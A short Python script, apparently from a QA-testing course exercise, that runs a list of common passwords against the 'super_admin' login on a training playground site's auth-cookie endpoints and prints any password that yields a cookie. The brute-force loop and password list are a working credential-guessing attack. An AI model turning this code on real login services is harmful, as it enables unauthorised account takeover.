import requests

login = 'super_admin'
passwords = ['0', '1234', '12345', '111111', '121212', '123123', '123456', '555555', '654321',
            '666666', '696969', '888888', '1234567', '7777777', '12345678', '123456789', '1234567890',
            '!@#$%^&*', '123qwe', '1q2w3e4r', '1qaz2wsx', 'aa123456', 'abc123', 'access', 'admin',
            'adobe123', 'ashley', 'azerty', 'bailey', 'baseball', 'batman', 'charlie', 'donald', 'dragon',
            'flower', 'Football', 'football', 'freedom', 'hello', 'hottie', 'iloveyou', 'jesus', 'letmein',
            'login', 'lovely', 'loveme', 'master', 'michael', 'monkey', 'mustang', 'ninja', 'passw0rd', 'password',
            'password1', 'photoshop', 'princess', 'qazwsx', 'qwerty', 'qwerty123', 'qwertyuiop', 'shadow', 'solo',
            'starwars', 'sunshine', 'superman', 'trustno1', 'welcome', 'whatever', 'zaq1zaq1']

for password in passwords:
    payload = {"login": login, "password": password}

    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_auth_cookie", data=payload)

    cookie_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        print(f"{login} : {password} \n{response2.text}")



